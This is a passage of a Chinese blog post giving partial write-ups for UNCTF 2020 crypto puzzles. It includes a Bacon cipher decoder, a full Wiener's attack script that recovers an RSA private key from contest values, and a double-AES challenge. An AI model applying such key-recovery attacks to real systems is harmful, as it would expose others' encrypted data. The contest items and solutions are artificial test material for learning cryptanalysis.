class="comment">#22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br></pre></td></tr></table></figure>
+
+<p>知道p+q和p-q能求出p和q 然后就能得到了 再复习一下加解密   m是明文，c是密文 n=p*q</p>
+<p>加密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m^e ≡ c (mod N) <span class="comment"># c = pow(m,e,n)</span></span><br></pre></td></tr></table></figure>
+
+<p>解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c^d ≡ m (mod N) <span class="comment"># m = pow(c,d,n)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="鞍山大法官开庭之缺的营养这一块怎么补"><a href="#鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="鞍山大法官开庭之缺的营养这一块怎么补"></a>鞍山大法官开庭之缺的营养这一块怎么补</h3><p>题目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">某日，鞍山大法官在点外卖时点了2个韭菜盒子，商家只送了1个，大法官给了该商家一个差评</span><br><span class="line">次日，该大法官又在该商家点了1个韭菜盒子，希望商家能补上上次的韭菜盒子，而商家又只发了一个韭菜盒子</span><br><span class="line">这名大法官一天正常要吃2个韭菜盒子，而该商家每天只给他1个韭菜盒子，请问该名大法官缺的营养这一块怎么补</span><br><span class="line">ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto</span><br><span class="line">flag格式：unctf&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>培根密码 字母大写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">o -&gt; a</span><br><span class="line">t -&gt; b</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">letters1 = [</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">letters2 = [</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">cipher1 = [</span><br><span class="line">    <span class="string">&quot;aaaaa&quot;</span>, <span class="string">&quot;aaaab&quot;</span>, <span class="string">&quot;aaaba&quot;</span>, <span class="string">&quot;aaabb&quot;</span>, <span class="string">&quot;aabaa&quot;</span>, <span class="string">&quot;aabab&quot;</span>, <span class="string">&quot;aabba&quot;</span>,</span><br><span class="line">    <span class="string">&quot;aabbb&quot;</span>, <span class="string">&quot;abaaa&quot;</span>, <span class="string">&quot;abaab&quot;</span>, <span class="string">&quot;ababa&quot;</span>, <span class="string">&quot;ababb&quot;</span>, <span class="string">&quot;abbaa&quot;</span>, <span class="string">&quot;abbab&quot;</span>,</span><br><span class="line">    <span class="string">&quot;abbba&quot;</span>, <span class="string">&quot;abbbb&quot;</span>, <span class="string">&quot;baaaa&quot;</span>, <span class="string">&quot;baaab&quot;</span>, <span class="string">&quot;baaba&quot;</span>, <span class="string">&quot;baabb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;babaa&quot;</span>, <span class="string">&quot;babab&quot;</span>, <span class="string">&quot;babba&quot;</span>, <span class="string">&quot;babbb&quot;</span>, <span class="string">&quot;bbaaa&quot;</span>, <span class="string">&quot;bbaab&quot;</span>,</span><br><span class="line">]</span><br><span class="line">cipher2 = [</span><br><span class="line">    <span class="string">&quot;AAAAA&quot;</span>, <span class="string">&quot;AAAAB&quot;</span>, <span class="string">&quot;AAABA&quot;</span>, <span class="string">&quot;AAABB&quot;</span>, <span class="string">&quot;AABAA&quot;</span>, <span class="string">&quot;AABAB&quot;</span>, <span class="string">&quot;AABBA&quot;</span>,</span><br><span class="line">    <span class="string">&quot;AABBB&quot;</span>, <span class="string">&quot;ABAAA&quot;</span>, <span class="string">&quot;ABAAA&quot;</span>, <span class="string">&quot;ABAAB&quot;</span>, <span class="string">&quot;ABABA&quot;</span>, <span class="string">&quot;ABABB&quot;</span>, <span class="string">&quot;ABBAA&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ABBAB&quot;</span>, <span class="string">&quot;ABBBA&quot;</span>, <span class="string">&quot;ABBBB&quot;</span>, <span class="string">&quot;BAAAA&quot;</span>, <span class="string">&quot;BAAAB&quot;</span>, <span class="string">&quot;BAABA&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BAABB&quot;</span>, <span class="string">&quot;BAABB&quot;</span>, <span class="string">&quot;BABAA&quot;</span>, <span class="string">&quot;BABAB&quot;</span>, <span class="string">&quot;BABBA&quot;</span>, <span class="string">&quot;BABBB&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bacon</span>(<span class="params">string</span>):</span></span><br><span class="line">    lists = []</span><br><span class="line">    <span class="comment"># 分割，五个一组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(string), <span class="number">5</span>):</span><br><span class="line">        lists.append(string[i:i+<span class="number">5</span>])</span><br><span class="line">    <span class="comment"># print(lists)</span></span><br><span class="line">    <span class="comment"># 循环匹配，得到下标，对应下标即可</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(lists)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> lists[i] == cipher1[j]:</span><br><span class="line">                <span class="comment"># print(j)</span></span><br><span class="line">                print(letters1[j], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">        flag+=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">bacon(flag)</span><br></pre></td></tr></table></figure>
+
+<h3 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h3><p>维纳攻击 exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_contfrac</span> (<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    Converts a rational x/y fraction into</span></span><br><span class="line"><span class="string">    a list of partial quotients [a0, ..., an] </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    a = x//y</span><br><span class="line">    <span class="keyword">if</span> a * y == x:</span><br><span class="line">        <span class="keyword">return</span> [a]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pquotients = rational_to_contfrac(y, x - a * y)</span><br><span class="line">        pquotients.insert(<span class="number">0</span>, a)</span><br><span class="line">        <span class="keyword">return</span> pquotients</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_contfrac</span>(<span class="params">frac</span>):</span>    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    computes the list of convergents</span></span><br><span class="line"><span class="string">    using the list of partial quotients </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(frac)):</span><br><span class="line">        convs.append(contfrac_to_rational(frac[<span class="number">0</span>:i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contfrac_to_rational</span> (<span class="params">frac</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an]</span></span><br><span class="line"><span class="string">     to an x/y rational.</span></span><br><span class="line"><span class="string">     &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> len(frac) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> len(frac) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (frac[<span class="number">0</span>], <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        remainder = frac[<span class="number">1</span>:len(frac)]</span><br><span class="line">        (num, denom) = contfrac_to_rational(remainder)</span><br><span class="line">        <span class="comment"># fraction is now frac[0] + 1/(num/denom), which is </span></span><br><span class="line">        <span class="comment"># frac[0] + denom/num.</span></span><br><span class="line">        <span class="keyword">return</span> (frac[<span class="number">0</span>] * num + denom, num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Extended Euclidean Algorithm</span></span><br><span class="line"><span class="string">    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    u, u1 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    v, v1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q = a // b</span><br><span class="line">        u, u1 = u1, u - q * u1</span><br><span class="line">        v, v1 = v1, v - q * v1</span><br><span class="line">        a, b = b, a - q * b</span><br><span class="line">    <span class="keyword">return</span> u, v, a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    2.8 times faster than egcd(a,b)[2]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    a,b=(b,a) <span class="keyword">if</span> a&lt;b <span class="keyword">else</span> (a,b)</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a,b=b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modInverse</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    d such that de = 1 (mod n)</span></span><br><span class="line"><span class="string">    e must be coprime to n</span></span><br><span class="line"><span class="string">    this is assumed to be true</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> egcd(e,n)[<span class="number">0</span>]%n</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">totient</span>(<span class="params">p,q</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the totient of pq</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitlength</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the bitlength of x</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> x &gt;= <span class="number">0</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        x = x&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isqrt</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the integer square root</span></span><br><span class="line"><span class="string">    for arbitrary large nonnegative integers</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;square root not defined for negative numbers&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    a, b = divmod(bitlength(n), <span class="number">2</span>)</span><br><span class="line">    x = <span class="number">2</span>**(a+b)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        y = (x + n//x)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> y &gt;= x:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        x = y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_perfect_square</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    If n is a perfect square it returns sqrt(n),</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    otherwise returns -1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    h = n &amp; <span class="number">0xF</span>; <span class="comment">#last hexadecimal &quot;digit&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> h &gt; <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span> <span class="comment"># return immediately in 6 cases out of 16.</span></span><br><span class="line">    <span class="comment"># Take advantage of Boolean short-circuit evaluation</span></span><br><span class="line">    <span class="keyword">if</span> ( h != <span class="number">2</span> <span class="keyword">and</span> h != <span class="number">3</span> <span class="keyword">and</span> h != <span class="number">5</span> <span class="keyword">and</span> h != <span class="number">6</span> <span class="keyword">and</span> h != <span class="number">7</span> <span class="keyword">and</span> h != <span class="number">8</span> ):</span><br><span class="line">        <span class="comment"># take square root if you must</span></span><br><span class="line">        t = isqrt(n)</span><br><span class="line">        <span class="keyword">if</span> t*t == n:</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d<span class="number">-1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d<span class="number">-1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=<span class="number">-1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">e= <span class="number">18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781</span></span><br><span class="line">n= <span class="number">147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701</span></span><br><span class="line">c= <span class="number">140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934</span></span><br><span class="line"></span><br><span class="line">d = hack_RSA(e,n)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
+
+<h3 id="wing"><a href="#wing" class="headerlink" title="wing"></a>wing</h3><p>Windings2字体</p>
+<img src="/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/1251468-20171101210543545-1753443987.png" alt="img" style="zoom:80%;">
+
+<p>一一对照就行</p>
+<h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>题目：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">random.seed(urandom(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">key1 = <span class="string">&#x27;0&#x27;</span>*<span class="number">13</span> + <span class="string">&#x27;&#x27;</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">key2 = <span class="string">&#x27;&#x27;</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]) + <span class="string">&#x27;0&#x27;</span>*<span class="number">13</span></span><br><span class="line"></span><br><span class="line">cipher1 = AES.new(key=key1.encode(), mode=AES.MODE_ECB)</span><br><span class="line">cipher2 = AES.new(key=key2.encode(), mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">pt = input(<span class="string">&quot;You have a chance to get something: &quot;</span>)</span><br><span class="line">pt = pt.encode()</span><br><span class="line"></span><br><span class="line">val = len(pt) % <span class="number">16</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> val == <span class="number">0</span>:</span><br><span class="line">    pt += <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span> - val)</span><br><span class="line"></span><br><span class="line">c1 = cipher1.encrypt(pt)</span><br><span class="line">c2 = cipher2.encrypt(c1)</span><br><span class="line">print(<span class="string">&#x27;Your cipher:&#123;&#125;&#x27;</span>.format(hexlify(c2)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(len(flag) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">c3 = cipher1.encrypt(flag)</span><br><span class="line">c4 = cipher2.encrypt(c3)</span><br><span class="line">print(<span class="string">&#x27;Your flag:&#123;&#125;&#x27;</span>.format(hexlify(c4)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># You have a chance to get something: UNCTF2020_Enjoy_Crypto~</span></span><br><span class="line"><span class="comment"># Your cipher:b&#x27;01a4e429e76db218fa0eb18f03ec69c9200a2362d8b4d7ea46170ce698389bbd&#x27;</span></span><br><span class="line"><span class="comment"># Your flag:b&#x27;196cc94c2d685beb54beeaa14c1dc0a6f3794d65fca0d1a1274515166e4255ab367383092e42d774992f74bc138faaad&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="UNCTF-2019"><a href="#UNCTF-2019" class="headerlink" title="UNCTF 2019"></a>UNCTF 2019</h1><h3 id="简单的备忘录"><a href="#简单的备忘录" class="headerlink" title="简单的备忘录"></a>简单的备忘录</h3><p>看到是graphql  这是个啥呢？</p>
+<blockquote>
+<p>GraphQL 是一种针对 Graph（图状数据）进行查询特别有优势的 Query Language（查询语言），所以叫做 GraphQL。它跟 SQL 的关系是共用 QL 后缀，就好像「汉语」和「英语」共用后缀一样，但他们本质上是不同的语言。GraphQL 跟用作存储的 NoSQL 没有必然联系，虽然 GraphQL 背后的实际存储可以选择 NoSQL 类型的数据库，但也可以用 SQL 类型的数据库，或者任意其它存储方式（例如文本文件、存内存里等等）。</p>
+</blockquote>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/>http://www.m00nback.xyz/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-11-29T21:26:57+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年11月29日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
